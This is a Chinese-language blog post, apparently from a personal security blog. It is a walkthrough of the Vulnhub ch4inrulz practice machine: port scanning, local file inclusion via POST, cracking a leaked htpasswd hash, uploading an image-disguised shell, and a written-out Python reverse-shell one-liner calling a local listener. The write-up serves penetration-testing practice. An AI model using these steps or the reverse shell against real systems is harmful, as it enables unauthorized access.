@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html>
+  <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  
+  <title>Vulnhub靶场 ch4inrulz渗透学习 - x1a0t&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  
+  <meta name="keywords" content=PENTEST,LFI>
+  
+  
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.02">
+  
+  
+    <link rel="alternate" href="/atom.xml " title="x1a0t&#39;s Blog" type="application/atom+xml">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 7.2.0"></head>
+  <body>
+    <div class="container">
+      <header class="header">
+  <div class="blog-title">
+    <a href="/" class="logo">x1a0t&#39;s Blog</a>
+    <div class="subtitle"></div>
+  </div>
+  <nav class="navbar">
+    <ul class="menu">
+      
+        <li class="menu-item">
+          <a href="/" class="menu-item-link">Home</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/links" class="menu-item-link">Links</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/notes" class="menu-item-link">Notes</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/about" class="menu-item-link">About</a>
+        </li>
+      
+    </ul>
+  </nav>
+</header>
+<article class="post">
+  <div class="post-title">
+    <h1 class="article-title">Vulnhub靶场 ch4inrulz渗透学习</h1>
+  </div>
+   <div class="post-meta">
+    <span class="post-time">2018-08-28</span>
+    
+      <ul class="post-tag-list" itemprop="keywords"><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/PENTEST/" rel="tag">PENTEST</a></li></ul>
+    
+  </div>
+  <div class="post-content">
+    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>早就知道Vulnhub有很多非常好的靶机供练习，但是不知咋的我的网页上没有下载链接，最后发现阔以直接通过<code>https://download.vulnhub.com/checksum.txt</code>这个校检MD5值的列表来获取到链接，下载速度比较慢，找了个小点的靶机上手试试</p>
+<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>通过netdiscover得知靶机IP为192.168.1.105，上nmap扫描端口：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nmap A 192.168.1.105</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.60 ( https://nmap.org ) at 2018-08-28 11:35 CST</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.1.105</span><br><span class="line"></span><br><span class="line">Host is up (0.00089s latency).</span><br><span class="line"></span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"></span><br><span class="line">21/tcp   open  ftp</span><br><span class="line"></span><br><span class="line">22/tcp   open  ssh</span><br><span class="line"></span><br><span class="line">80/tcp   open  http</span><br><span class="line"></span><br><span class="line">8011/tcp open  unknown</span><br><span class="line"></span><br><span class="line">Nmap done: 2 IP addresses (1 host up) scanned in 2.43 seconds</span><br></pre></td></tr></table></figure>
+
+<p>21端口允许匿名登录，但好像就没什么东西了</p>
+<p>80端口是一个Web页面，目录扫描并没发现有用的信息，仅development目录存在一个http认证弹窗</p>
+<p>8011端口是一个标题为Development的页面，目录扫描发现存在api目录，访问提示有四个文件，但只有一个<code>files_api.php</code>文件访问存在，提示：</p>
+<blockquote>
+<p>No parameter called file passed to me</p>
+<p>* Note : this API don’t use json , so send the file name in raw format</p>
+</blockquote>
+<p>猜测是个文件包含点，传入<code>file=/etc/passwd</code>警告hacker攻击，改为POST方式成功包含</p>
+<p><img src="/2018/08/28/Study-Hacking-On-Vulnhub-ch4inrulz/2.png"></p>
+<p>想到包含一下ssh日志文件getshell，但是失败了，阔能是没有权限，思路中断</p>
+<p>（偷看writeup）发现80端口下还有一个备份index.html.bak，下载下来看一下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>It works!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>This is the default web page for this server.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>The web server software is running but no content has been added, yet.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/development&quot;</span>&gt;</span>development<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- I will use frank:$apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0 as the .htpasswd file to protect the development path --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>提示了development目录的认证用户密码，也不知道是啥加密方式，通过工具john阔以解出密码来为frank!!!，该工具主要针对Unix弱密码解密</p>
+<p>拿着密码，访问80端口中的development目录，提示有个上传点，扫描目录发现有个uploader目录</p>
+<p><img src="/2018/08/28/Study-Hacking-On-Vulnhub-ch4inrulz/3.png"></p>
+<p>其中是一个图片上传点，想着上传一个图片马上去，由于网站有检测，需要添加图片标志头，上传成功有返回信息：</p>
+<blockquote>
+<p>File is an image - image&#x2F;gif.The file a.gif has been uploaded to my uploads path. </p>
+</blockquote>
+<p>（偷看writeup）这里需要通过组合字典去爆破文件路径，得到FRANKuploads目录，我了个去。</p>
+<p>包含图片马getshell后，直接反弹shell不成功，查看了下靶机有perl和python，阔以用来弹shell：</p>
+<p><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.102&quot;，1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></p>
+<p><img src="/2018/08/28/Study-Hacking-On-Vulnhub-ch4inrulz/4.png"></p>
+<p>后面的提权部分，看了writeup也没搞定，算了这方面我也没啥兴趣</p>
+<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>期间偷瞄的writeup来自：<a href="https://xz.aliyun.com/t/2593">https://xz.aliyun.com/t/2593</a></p>
+<p>做完后还看了这篇：<a href="https://blog.techorganic.com/2018/08/19/ch4inrulz-hacking-challenge/">https://blog.techorganic.com/2018/08/19/ch4inrulz-hacking-challenge/</a></p>
+<p>两篇文章都是用的php来反弹shell，且后面这位收集信息做得非常充分，在判断上传文件路径时，也是通过php伪协议来读取了上传脚本，其中就有完整的上传路径</p>
+<p>回过头来看，如果没有这么个上传点，那么包含日志文件可能是非常好的方向，毕竟ftp和ssh都是比较常见的服务</p>
+
+  </div>
+  <div class="post-footer">
+    <a href="#top" class="top">Post.Top</a>
+  </div>
+</article>
+<footer>
+  &copy; 2024
+  <span class="author">
+    x1a0t
+  </span>
+</footer>
+    </div>
+  </body>
+</html>
